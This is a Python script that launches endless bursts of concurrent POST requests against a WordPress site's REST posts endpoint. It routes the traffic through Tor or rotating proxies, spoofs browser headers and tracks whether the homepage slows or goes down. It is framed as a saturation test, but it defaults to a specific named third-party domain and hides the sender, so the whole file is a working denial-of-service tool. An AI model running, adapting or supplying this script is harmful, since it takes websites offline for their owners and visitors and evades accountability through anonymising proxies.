#!/usr/bin/env python3
"""
vps_burst.py — WordPress REST API POST burst (wp/v2/posts endpoint).
Single endpoint, high concurrency — measures raw PHP worker saturation.
Uses make_pool() — auto-detects Tor > Webshare > file proxies.
"""

import requests, threading, time, urllib3, argparse, os
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime
from proxy_pool import make_pool

G="\033[0;32m"; R="\033[0;31m"; Y="\033[0;33m"; C="\033[0;36m"; W="\033[0m"; B="\033[1m"

SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))

ap = argparse.ArgumentParser()
ap.add_argument("--target",      default="metoo-buffalo.com")
ap.add_argument("--concurrency", type=int, default=30)
ap.add_argument("--timeout",     type=int, default=20)
ap.add_argument("--proxy-file",  default=os.path.join(SCRIPT_DIR, "proxies.txt"))
ap.add_argument("--bursts",      type=int, default=0, help="0 = infinite")
args = ap.parse_args()

domain = args.target.replace("https://","").replace("http://","").strip("/")
BASE   = f"https://{domain}"
TARGET = BASE + "/wp-json/wp/v2/posts"

HEADERS = {
    "User-Agent":        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Accept":            "application/json, text/plain, */*",
    "Content-Type":      "application/json",
    "sec-fetch-dest":    "empty",
    "sec-fetch-mode":    "cors",
    "Referer":           BASE + "/",
}

PAYLOAD = '{"title":"t","content":"t","status":"draft"}'

pool = make_pool(args.proxy_file)

def fire(req_num):
    proxy   = pool.next(slot=req_num)
    proxies = {"http": proxy, "https": proxy} if proxy else {}
    t0 = time.time()
    try:
        r = requests.post(TARGET, headers=HEADERS, data=PAYLOAD,
                          proxies=proxies, timeout=args.timeout, verify=False)
        return r.status_code, time.time() - t0
    except Exception:
        pool.mark_dead(proxy)
        return 0, time.time() - t0

# homepage monitor
mon = {"ms": 0, "code": 0, "tag": "...", "color": W}
mon_lock = threading.Lock()

def monitor_loop():
    while True:
        t0m = time.time()
        try:
            r = requests.get(BASE + "/", timeout=12, verify=False,
                             headers={"User-Agent": "Mozilla/5.0 Chrome/124"})
            ms, code = (time.time()-t0m)*1000, r.status_code
            color, tag = (R,"DOWN") if code==503 else (G,"FAST") if ms<800 else (Y,"SLOW") if ms<2000 else (R,"DEGRADED")
        except:
            ms, code, color, tag = (time.time()-t0m)*1000, 0, R, "TIMEOUT"
        with mon_lock:
            mon.update(ms=ms, code=code, tag=tag, color=color)
        time.sleep(4)

threading.Thread(target=monitor_loop, daemon=True).start()
time.sleep(1)

print(f"\n{B}{'='*68}{W}")
print(f"  vps_burst — WordPress REST API POST Burst")
print(f"{'='*68}")
print(f"  Target      : {TARGET}")
print(f"  Concurrency : {args.concurrency}")
print(f"  Proxy       : {type(pool).__name__} ({pool.alive()} alive)")
print(f"  Mode        : Continuous until Ctrl+C")
print(f"{B}{'='*68}{W}\n")
print(f"  {'BURST':<6} {'TIME':<9} {'200':>4} {'401':>4} {'403':>4} {'503':>4} {'ERR':>4} {'AVG':>7}  STATUS")
print(f"  {'─'*66}")

burst=0; total=0; t0=time.time()
try:
    while True:
        if args.bursts and burst >= args.bursts: break
        burst += 1
        ts = datetime.now().strftime("%H:%M:%S")
        with ThreadPoolExecutor(max_workers=args.concurrency) as ex:
            futs  = [ex.submit(fire, i) for i in range(args.concurrency)]
            codes, times = [], []
            for f in as_completed(futs):
                c, t = f.result(); codes.append(c); times.append(t); total += 1

        c200=codes.count(200); c401=codes.count(401)
        c403=codes.count(403); c503=codes.count(503); cerr=codes.count(0)
        avg = sum(times)/len(times)

        if c503 > 0:   st = f"{R}{B}DOWN{W}"
        elif avg > 8:  st = f"{R}HEAVY DEGRADED{W}"
        elif avg > 4:  st = f"{Y}DEGRADED{W}"
        elif c200 > 0: st = f"{G}HITTING PHP-FPM{W}"
        else:          st = f"{Y}BLOCKED AT EDGE{W}"

        with mon_lock:
            mon_str = f"{mon['color']}{mon['ms']:.0f}ms {mon['tag']} HTTP {mon['code']}{W}"

        print(f"  {C}[{burst:>4}]{W} {ts}  {c200:>4} {c401:>4} {c403:>4} "
              f"{R if c503 else W}{c503:>4}{W} {cerr:>4} {avg:>6.2f}s  {st}  │ {mon_str}")

        pool.maybe_refresh()

except KeyboardInterrupt:
    pass

elapsed = time.time() - t0
print(f"\n{B}{'='*68}{W}")
print(f"  Bursts:{burst}  Reqs:{total}  Runtime:{elapsed:.0f}s")
print(f"{B}{'='*68}{W}\n")
